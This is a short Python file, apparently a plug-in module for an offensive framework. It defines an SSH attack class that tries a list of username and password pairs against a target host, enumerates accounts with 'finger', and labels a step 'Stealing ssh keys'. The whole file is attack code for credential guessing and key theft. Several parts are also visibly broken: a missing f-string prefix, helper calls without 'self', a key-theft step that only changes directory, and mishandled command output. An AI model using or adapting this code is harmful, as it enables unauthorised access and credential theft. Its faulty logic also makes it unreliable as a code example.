from hydra import Exploit
import sys, paramiko, getpass

class SSH(Exploit):
    name = "ssh"
    port = 22

    def getloot(self, ip_address, credentials):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # try to log into ssh using credentials
        for c in credentials:
            print("Trying to SSH into IP address {ip_address} with:\n username {c[0]} and password {c[1]}")
            try:
                ssh.connect(ip_address, username=c[0], password=c[1])

                print('Success. Gathering all usernames.')
                usernames = get_usernames(ssh)
                
                print('Stealing ssh keys.')
                get_sshkeys(self, ssh)
                
                return usernames
            except:
                print("Authentication failed.")

    def get_sshkeys(self, ssh):
        ssh.exec_command ('cd ~/.ssh')

    def get_usernames(self, ssh):
        ssh.invoke_shell()
        stdout= ssh.exec_command ('finger')
        stdout.readline()

        usernames = []
        for line in stdout:
	        toks = line.split(' ')
	        loot = (toks[0], None)
	        if loot not in usernames:
	            usernames.append(loot)
        return usernames


